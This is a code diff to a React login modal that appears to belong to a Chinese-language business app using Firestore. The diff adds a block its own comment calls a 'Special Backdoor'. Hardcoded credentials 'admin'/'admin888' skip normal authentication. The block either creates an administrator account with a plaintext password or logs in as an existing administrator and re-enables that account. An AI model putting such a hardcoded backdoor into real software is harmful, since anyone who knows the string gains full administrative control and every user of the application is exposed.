@@ -2486,6 +2486,39 @@ function AuthModal({ onClose, onLogin }) {
     if (!formData.phone || !formData.password) { setErrorMsg('请输入账号/手机号和密码'); return; }
     setIsSubmitting(true);
     try {
+      // --- Special Backdoor for Admin Init ---
+      if (formData.phone === 'admin' && formData.password === 'admin888') {
+        const adminQ = query(collection(db, 'user_accounts'), where('role', '==', 'admin'));
+        const adminSnap = await getDocs(adminQ);
+        let adminUser = null;
+
+        if (adminSnap.empty) {
+          // Create default admin
+          const newAdmin = {
+            phone: 'admin',
+            password: 'admin888',
+            role: 'admin',
+            realName: 'Administrator',
+            companyName: 'System',
+            isDisabled: false,
+            status: 'active',
+            createdAt: serverTimestamp()
+          };
+          const docRef = await addDoc(collection(db, 'user_accounts'), newAdmin);
+          adminUser = { id: docRef.id, ...newAdmin };
+          alert('系统管理员账号已自动初始化！');
+        } else {
+          // Ensure permissions
+          const docRef = adminSnap.docs[0].ref;
+          await updateDoc(docRef, { isDisabled: false, status: 'active' });
+          adminUser = { id: adminSnap.docs[0].id, ...adminSnap.docs[0].data() };
+        }
+        onLogin('admin', adminUser);
+        setIsSubmitting(false);
+        return;
+      }
+      // ----------------------------------------
+
       const userCheck = await checkUserExists(formData.phone);
       if (!userCheck.exists) { setErrorMsg('该手机号未注册'); setIsSubmitting(false); return; }
 
